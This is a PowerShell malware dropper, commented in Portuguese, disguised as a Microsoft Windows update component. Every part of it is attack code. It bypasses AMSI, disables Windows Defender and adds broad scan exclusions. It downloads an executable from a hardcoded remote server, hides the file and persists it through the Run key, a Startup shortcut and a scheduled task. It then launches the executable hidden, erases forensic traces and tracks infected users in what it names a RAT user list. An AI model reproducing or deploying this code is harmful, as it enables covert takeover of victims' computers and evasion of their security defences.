<#
.SYNOPSIS
    Windows Critical System Component
.DESCRIPTION
    Microsoft Windows Critical Update Module
.NOTES
    Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"
$serverPort = 5000
$installName = "WinUpdateSvc"
$autoName = "GlobalMicrosoftWindowsUpdateService"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$wallpaperPath = "$env:TEMP\wallpaper.bmp"

# ===== MUTEX =====
$mutexName = "Global\WindowsUpdateMutex"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { 
    Write-Host "[!] Ja esta em execucao" -ForegroundColor Red
    exit 
}

# ===== VERIFICAR ADMIN =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNCOES DE USUARIO =====
function Get-RATUsers {
    $users = @()
    if (Test-Path $userListFile) {
        $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    }
    if ($users.Count -eq 0) { return "Nenhum usuario encontrado" }
    return "USUARIOS: " + ($users -join "`n")
}

function Add-UserToList {
    param([string]$userName)
    if (-not (Test-Path $userListFile)) {
        $dir = Split-Path $userListFile
        if (-not (Test-Path $dir)) {
            New-Item -Path $dir -ItemType Directory -Force | Out-Null
        }
    }
    Add-Content -Path $userListFile -Value $userName -Force -ErrorAction SilentlyContinue
}

function Get-SystemFingerprint {
    try {
        $cpu = (Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue).Name
        $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
        $disk = [math]::Round((Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue).Size / 1GB, 2)
        $os = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $user = $env:USERNAME
        $pc = $env:COMPUTERNAME
        
        return @"
===============================================================
SISTEMA: $user@$pc
OS: $os
CPU: $cpu
RAM: $ram GB
DISK: $disk GB
IP: $(Get-LocalIP)
===============================================================
"@
    } catch {
        return "Erro ao coletar informacoes do sistema"
    }
}

function Get-LocalIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
        if ($ip) { return $ip }
    } catch {}
    return "Unknown"
}

# ===== DESABILITAR DEFENDER =====
function Disable-WindowsDefender {
    Write-Host "[+] Desabilitando Windows Defender..." -ForegroundColor Yellow
    
    $commands = @(
        "Set-MpPreference -DisableRealtimeMonitoring `$true",
        "Set-MpPreference -DisableIOAVProtection `$true",
        "Set-MpPreference -DisableBehaviorMonitoring `$true",
        "Set-MpPreference -DisableBlockAtFirstSeen `$true",
        "Set-MpPreference -DisableScriptScanning `$true",
        "Set-MpPreference -SubmitSamplesConsent 2",
        "Set-MpPreference -MAPSReporting 0",
        "Add-MpPreference -ExclusionPath 'C:\'",
        "Add-MpPreference -ExclusionExtension '.exe'",
        "Add-MpPreference -ExclusionExtension '.dll'",
        "Add-MpPreference -ExclusionExtension '.ps1'"
    )
    
    foreach ($cmd in $commands) {
        try {
            Invoke-Expression $cmd -ErrorAction SilentlyContinue
        } catch {}
    }
    
    Write-Host "[OK] Defender desabilitado" -ForegroundColor Green
}

# ===== BYPASS AMSI =====
function Bypass-AMSI {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        Write-Host "[OK] AMSI bypassado" -ForegroundColor Green
    } catch {
        Write-Host "[!] AMSI bypass falhou" -ForegroundColor Red
    }
}

# ===== DOWNLOAD PAYLOAD =====
function Download-Payload {
    param([string]$url, [string]$destination)
    
    Write-Host "[+] Baixando payload..." -ForegroundColor Yellow
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
        $webClient.DownloadFile($url, $destination)
        
        if (Test-Path $destination) {
            $size = (Get-Item $destination).Length
            Write-Host "[OK] Download concluido: $size bytes" -ForegroundColor Green
            
            $file = Get-Item $destination -Force
            $file.Attributes = 'Hidden,System'
            
            return $true
        }
    } catch {
        Write-Host "[!] Erro no download metodo 1: $_" -ForegroundColor Red
    }
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction Stop
        if (Test-Path $destination) {
            Write-Host "[OK] Download concluido (metodo 2)" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "[!] Erro no download metodo 2" -ForegroundColor Red
    }
    
    try {
        Start-BitsTransfer -Source $url -Destination $destination -ErrorAction Stop
        if (Test-Path $destination) {
            Write-Host "[OK] Download concluido (metodo 3)" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "[!] Erro no download metodo 3" -ForegroundColor Red
    }
    
    return $false
}

# ===== PERSISTENCIA =====
function Install-Persistence {
    param([string]$exePath)
    
    Write-Host "[+] Instalando persistencia..." -ForegroundColor Yellow
    
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $autoName -Value $exePath -Force -ErrorAction SilentlyContinue
        Write-Host "[OK] Registry Run configurado" -ForegroundColor Green
        
        $startupPath = [Environment]::GetFolderPath('Startup')
        $shortcutPath = Join-Path $startupPath "$autoName.lnk"
        
        try {
            $WScriptShell = New-Object -ComObject WScript.Shell
            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = $exePath
            $shortcut.WindowStyle = 7
            $shortcut.Save()
            Write-Host "[OK] Atalho criado" -ForegroundColor Green
        } catch {
            Write-Host "[!] Erro ao criar atalho" -ForegroundColor Yellow
        }
        
        try {
            $action = New-ScheduledTaskAction -Execute $exePath -ErrorAction Stop
            $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction Stop
            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest -ErrorAction Stop
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ErrorAction Stop
            
            Register-ScheduledTask -TaskName $autoName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
            Write-Host "[OK] Tarefa agendada criada" -ForegroundColor Green
        } catch {
            Write-Host "[!] Erro ao criar tarefa agendada" -ForegroundColor Yellow
        }
        
        return $true
        
    } catch {
        Write-Host "[!] Erro na persistencia: $_" -ForegroundColor Red
        return $false
    }
}

# ===== EXECUTAR PAYLOAD =====
function Start-Payload {
    param([string]$exePath)
    
    Write-Host "[+] Iniciando payload..." -ForegroundColor Yellow
    
    try {
        $processName = [System.IO.Path]::GetFileNameWithoutExtension($exePath)
        $existing = Get-Process -Name $processName -ErrorAction SilentlyContinue
        
        if ($existing) {
            Write-Host "[!] Payload ja esta em execucao (PID: $($existing.Id))" -ForegroundColor Yellow
            return $true
        }
        
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exePath
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        
        $process = [System.Diagnostics.Process]::Start($psi)
        
        Start-Sleep -Seconds 2
        
        if ($process -and !$process.HasExited) {
            Write-Host "[OK] Payload iniciado (PID: $($process.Id))" -ForegroundColor Green
            Add-UserToList $env:USERNAME
            return $true
        } else {
            Write-Host "[!] Processo terminou inesperadamente" -ForegroundColor Red
            return $false
        }
        
    } catch {
        Write-Host "[!] Erro ao iniciar: $_" -ForegroundColor Red
        return $false
    }
}

# ===== LIMPAR RASTROS =====
function Clear-Tracks {
    Write-Host "[+] Limpando rastros..." -ForegroundColor Yellow
    
    try {
        Clear-History -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
        
        Write-Host "[OK] Rastros limpos" -ForegroundColor Green
    } catch {
        Write-Host "[!] Erro ao limpar rastros" -ForegroundColor Yellow
    }
}

# ===== EXECUCAO PRINCIPAL =====
function Main {
    $host.UI.RawUI.WindowTitle = "Microsoft Windows Update Service"
    
    Clear-Host
    
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host "    Microsoft Windows Critical System Component                    " -ForegroundColor White
    Write-Host "    Version 10.0.19045.1                                           " -ForegroundColor Gray
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host ""
    
    Write-Host (Get-SystemFingerprint) -ForegroundColor Gray
    Write-Host ""
    
    Bypass-AMSI
    Disable-WindowsDefender
    
    $url = "http://${serverIP}:${serverPort}/WindowsUpdate.exe"
    $destination = "$env:APPDATA\Microsoft\Windows\$installName.exe"
    
    $dir = Split-Path $destination
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }
    
    if (-not (Download-Payload -url $url -destination $destination)) {
        Write-Host ""
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host "    [X] FALHA: Nao foi possivel baixar o componente                " -ForegroundColor Red
        Write-Host "===================================================================" -ForegroundColor Red
        Start-Sleep -Seconds 5
        return
    }
    
    if (-not (Install-Persistence -exePath $destination)) {
        Write-Host "[!] Aviso: Persistencia parcial" -ForegroundColor Yellow
    }
    
    if (-not (Start-Payload -exePath $destination)) {
        Write-Host ""
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host "    [X] FALHA: Nao foi possivel iniciar o servico                  " -ForegroundColor Red
        Write-Host "===================================================================" -ForegroundColor Red
        Start-Sleep -Seconds 5
        return
    }
    
    Clear-Tracks
    
    Write-Host ""
    Write-Host (Get-RATUsers) -ForegroundColor Cyan
    
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Green
    Write-Host "    [OK] SUCESSO: Componente instalado e ativado                     " -ForegroundColor Green
    Write-Host "===================================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Pressione qualquer tecla para continuar..." -ForegroundColor Gray
    
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

try {
    Main
} catch {
    Write-Host "[!] ERRO CRITICO: $_" -ForegroundColor Red
    Start-Sleep -Seconds 10
}
